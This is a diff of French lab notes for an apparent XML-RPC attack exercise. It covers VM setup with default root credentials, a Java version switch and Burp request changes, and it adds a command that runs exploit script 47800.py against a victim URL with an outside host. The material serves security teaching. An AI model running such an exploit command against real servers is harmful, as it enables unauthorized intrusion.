@@ -2,19 +2,21 @@
 
 Vagrant up
 
-
-
-#Desactiver la synchronisation automatique de la date/heure de votre VM :
-
-VBoxManage setextradata "VM-Name" "VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled" 1
-
-
-
 #Lancer la machine virtuelle :
 
 Username: root
 Mot de passe : toor
 
+
+#Si la connection n'est pas établie (Wired unmanaged) NetwokManager -> true
+nano /etc/NetworkManager/NetworkManager.conf  
+Service network-manager restart
+
+# éteignez la VM
+
+#Desactiver la synchronisation automatique de la date/heure de votre VM :
+
+VBoxManage setextradata "xmlrpc_default_1609679322372_10928" "VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled" 1
 
 
 #dès que vous êtes à l'intérieur de votre VM cloner le fichier XMLRPC pour avoir les fichiers nécessaires :
@@ -22,15 +24,13 @@ Mot de passe : toor
 git clone https://github.com/Hichamdarouach/XMLRPC.git
 
 
-
-#Cahngez la version de java à utiliser (il nous faut la version 8)
+#Changez la version de java à utiliser (il nous faut la version 8)
 
 sudo update-alternatives --config java
 
 #Puis sélectionner la version 8 selon le numéro qui lui est attribué
 
 x
-
 
 #Lancer Burp professionnel
 
@@ -54,6 +54,8 @@ POST -> GET
 </methodCall>
 
 
+#attack de la machine victime
+Python3 47800.py attack http://CHANGELINK/ http://xmlrpcensimag.tk
 
 
 Liens:
